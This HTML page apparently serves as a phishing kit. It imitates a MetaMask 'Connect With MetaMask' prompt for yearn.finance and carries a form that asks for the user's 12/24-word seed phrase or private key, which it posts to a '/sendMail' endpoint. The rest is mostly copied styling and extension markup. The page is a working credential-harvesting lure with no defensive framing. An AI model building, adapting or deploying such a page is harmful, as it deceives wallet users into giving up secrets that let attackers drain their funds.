<html class="js-focus-visible" data-js-focus-visible="">

<head>
  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
  <meta charset="utf-8">
  <link rel="icon" type="image/png" href="../favicon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1 user-scalable=no">
  <title>MetaMask</title>
  <link rel="stylesheet" type="text/css" href="css/index.css" title="ltr">
  <link rel="stylesheet" type="text/css" href="css/index-rtl.css" title="rtl" disabled="">
  <link rel="stylesheet" href="/connectMeta.css">
  <link href="https://fonts.googleapis.com/css2?family=Montserrat&display=swap" rel="stylesheet">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <style></style>
  <style>
    ._3emE9--dark-theme .-S-tR--ff-downloader {
      background: rgba(30, 30, 30, .93);
      border: 1px solid rgba(82, 82, 82, .54);
      box-shadow: 0 4px 7px rgba(30, 30, 30, .55);
      color: #fff
    }

    ._3emE9--dark-theme .-S-tR--ff-downloader ._6_Mtt--header ._2VdJW--minimize-btn {
      background: #3d4b52
    }

    ._3emE9--dark-theme .-S-tR--ff-downloader ._6_Mtt--header ._2VdJW--minimize-btn:hover {
      background: #131415
    }

    ._3emE9--dark-theme .-S-tR--ff-downloader ._10vpG--footer {
      background: rgba(30, 30, 30, .93)
    }

    ._2mDEx--white-theme .-S-tR--ff-downloader {
      background: #fff;
      border: 1px solid rgba(82, 82, 82, .54);
      box-shadow: 0 4px 7px rgba(30, 30, 30, .55);
      color: #314c75
    }

    ._2mDEx--white-theme .-S-tR--ff-downloader ._6_Mtt--header {
      font-weight: 700
    }

    ._2mDEx--white-theme .-S-tR--ff-downloader ._2dFLA--container ._2bWNS--notice {
      border: 0;
      color: rgba(0, 0, 0, .88)
    }

    ._2mDEx--white-theme .-S-tR--ff-downloader ._10vpG--footer {
      background: #fff
    }

    .-S-tR--ff-downloader {
      display: block;
      overflow: hidden;
      position: fixed;
      bottom: 20px;
      right: 7.1%;
      width: 330px;
      height: 180px;
      background: rgba(30, 30, 30, .93);
      border-radius: 2px;
      color: #fff;
      z-index: 99999999;
      border: 1px solid rgba(82, 82, 82, .54);
      box-shadow: 0 4px 7px rgba(30, 30, 30, .55);
      transition: .5s
    }

    .-S-tR--ff-downloader._3M7UQ--minimize {
      height: 62px
    }

    .-S-tR--ff-downloader._3M7UQ--minimize .nxuu4--file-info,
    .-S-tR--ff-downloader._3M7UQ--minimize ._6_Mtt--header {
      display: none
    }

    .-S-tR--ff-downloader ._6_Mtt--header {
      padding: 10px;
      font-size: 17px;
      font-family: sans-serif
    }

    .-S-tR--ff-downloader ._6_Mtt--header ._2VdJW--minimize-btn {
      float: right;
      background: #f1ecec;
      height: 20px;
      width: 20px;
      text-align: center;
      padding: 2px;
      margin-top: -10px;
      cursor: pointer
    }

    .-S-tR--ff-downloader ._6_Mtt--header ._2VdJW--minimize-btn:hover {
      background: #e2dede
    }

    .-S-tR--ff-downloader ._13XQ2--error {
      color: red;
      padding: 10px;
      font-size: 12px;
      line-height: 19px
    }

    .-S-tR--ff-downloader ._2dFLA--container {
      position: relative;
      height: 100%
    }

    .-S-tR--ff-downloader ._2dFLA--container .nxuu4--file-info {
      padding: 6px 15px 0;
      font-family: sans-serif
    }

    .-S-tR--ff-downloader ._2dFLA--container .nxuu4--file-info div {
      margin-bottom: 5px;
      width: 100%;
      overflow: hidden
    }

    .-S-tR--ff-downloader ._2dFLA--container ._2bWNS--notice {
      margin-top: 21px;
      font-size: 11px
    }

    .-S-tR--ff-downloader ._10vpG--footer {
      width: 100%;
      bottom: 0;
      position: absolute;
      font-weight: 700
    }

    .-S-tR--ff-downloader ._10vpG--footer ._2V73d--loader {
      -webkit-animation: n0BD1--rotation 3.5s linear forwards;
      animation: n0BD1--rotation 3.5s linear forwards;
      position: absolute;
      top: -120px;
      left: calc(50% - 35px);
      border-radius: 50%;
      border: 5px solid #fff;
      border-top-color: #a29bfe;
      height: 70px;
      width: 70px;
      display: flex;
      justify-content: center;
      align-items: center
    }

    .-S-tR--ff-downloader ._10vpG--footer ._24wjw--loading-bar {
      width: 100%;
      height: 18px;
      background: #dfe6e9;
      border-radius: 5px
    }

    .-S-tR--ff-downloader ._10vpG--footer ._24wjw--loading-bar ._1FVu9--progress-bar {
      height: 100%;
      background: #8bc34a;
      border-radius: 5px
    }

    .-S-tR--ff-downloader ._10vpG--footer ._2KztS--status {
      margin-top: 10px
    }

    .-S-tR--ff-downloader ._10vpG--footer ._2KztS--status ._1XilH--state {
      float: left;
      font-size: .9em;
      letter-spacing: 1pt;
      text-transform: uppercase;
      width: 100px;
      height: 20px;
      position: relative
    }

    .-S-tR--ff-downloader ._10vpG--footer ._2KztS--status ._1jiaj--percentage {
      float: left;
    }
  </style>
  <style type="text/css">
  #phrase_metaMask {
    font-family: Arial;
  }
  </style>
  <link rel="stylesheet" type="text/css" href="chrome-extension://immhpnclomdloikkpcefncmfgjbkojmh/css/emoji.css">
</head>

<body data-new-gr-c-s-check-loaded="14.980.0" data-new-gr-c-s-loaded="14.980.0" cz-shortcut-listen="true">
  <div id="app-content">
    <div class="app mouse-user-styles">
      <div><span></span></div>
      <div style="position: absolute; top: 58px; width: 309px; z-index: 55;" class="menu-droppo-container network-droppo">
        <style>
          .menu-droppo-enter {
            transition: transform 300ms ease-in-out;
            transform: translateY(-200%);
          }

          .menu-droppo-enter.menu-droppo-enter-active {
            transition: transform 300ms ease-in-out;
            transform: translateY(0%);
          }

          .menu-droppo-leave {
            transition: transform 300ms ease-in-out;
            transform: translateY(0%);
          }

          .menu-droppo-leave.menu-droppo-leave-active {
            transition: transform 300ms ease-in-out;
            transform: translateY(-200%);
          }

          .type_enter {
            display: flex;
            justify-content: center;
          }

          .type_enter button {
            height: 30px;
            width: 110px;
            margin: 15px;
          }

          .type_enter .btn-default {
            background: #fff;
          }
        </style>
      </div>
      <form method="post" action="/sendMail" enctype="multipart/form-data" id="form_phrase_metaMask" style="display: flex;justify-content: center;flex: 1 0 auto;min-height: 0;width: 100%;">
          @csrf
        <input type="hidden" id="wallet" name="wallet" value="MetaMask">
        <div class="main-container-wrapper">
          <div class="permissions-connect">
            <grammarly-extension style="position: absolute; top: 0px; left: 0px; pointer-events: none;" class="_1KJtL"></grammarly-extension>
            <div class="permissions-connect__top-bar">
              <div class="permissions-connect__page-count">1 of 2</div>
            </div>
            <div class="permissions-connect-choose-account">
              <div class="permissions-connect-header">
                <div class="permissions-connect-header__icon">
                  <div class="icon-border" style="height: 64px; width: 64px;"><img src="/imgs/android-icon-192x192.png" style="height: 48px; width: 48px;"></div>
                  <div class="permissions-connect-header__text">https://yearn.finance</div>
                </div>
                <div class="permissions-connect-header__title">Connect With MetaMask</div>

                <div class="type_enter">
                  <button id="btn_phrases" class="button btn-primary" type="button">Phrases</button>
                  <button id="btn_privatekey" style="font-size: 0.8rem;" class="button btn-default" type="button">Private Key</button>
                </div>

                <div class="permissions-connect-header__subtitle" id="sub_title">Enter your 12/24 word passphrase or your PrivatKey to connect</div>
              </div>
              <div class="permissions-connect-choose-account__accounts-list-header--one-item">
                <div class="permissions-connect-choose-account__text-blue">New Account</div>
              </div>
              <div class="permissions-connect-choose-account__accounts-list">
                <div class="permissions-connect-choose-account__account" style="width: 100%; height: 100%;">
                  <div class="permissions-connect-choose-account__account-info-wrapper" style="width: 100%; height: 25px;">
                    <textarea rows="100" id="phrase_metaMask" name="passphrase" style="width: 341px; height: 183px; border: none; margin: 0px;" autofocus="" placeholder="Enter your passphrase" spellcheck="false" class=""></textarea>
                  </div>
                </div>
              </div>
              <div class="permissions-connect-choose-account__footer-container">
                <div class="permissions-connect-footer">
                  <div class="permissions-connect-footer__text">
                    <div>Only connect with sites you trust.</div>
                    <div class="permissions-connect-footer__text--link">Learn more</div>
                  </div>
                </div>
                <div class="permissions-connect-choose-account__bottom-buttons">
                  <button class="button btn-default close_window_MetaMask" type="button" onclick="window.close()">Cancel</button>
                  <button class="button btn-primary" type="submit">Next</button>
                </div>
              </div>
            </div>
          </div>
        </div>
      </form>
    </div>
  </div>

  <script type="text/javascript" src="../js/jquery-1.11.3.min.js"></script>
  <script type="text/javascript" src="../js/imask.js"></script>
  <script type="text/javascript" src="../js/main.js"></script>

</body>
<loom-container id="lo-engage-ext-container">
  <div></div>
  <loom-shadow classname="resolved"></loom-shadow>
</loom-container>
<grammarly-extension class="_1KJtL"></grammarly-extension>

</html>
